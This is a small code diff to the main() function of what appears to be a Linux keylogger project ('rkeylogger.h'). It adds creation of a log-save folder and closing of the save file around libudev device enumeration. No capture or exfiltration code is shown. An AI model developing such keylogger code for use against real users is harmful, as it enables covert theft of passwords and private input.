@@ -5,6 +5,11 @@
 #include "rkeylogger.h"
 
 int main() {
+    if(!create_save_folder()){
+        std::cerr << "[ ERROR ]: cannot create folder to save the log.\n" << std::endl;
+        return -1;
+    }
+
     struct udev *udev = udev_new();
     if (!udev) {
         std::cerr << "[ ERROR ]: cannot use libudev.\n" << std::endl;
@@ -36,5 +41,6 @@ int main() {
 
     udev_enumerate_unref(enumerate);
     udev_unref(udev);
+    close_save_file();
     return 0;
 }
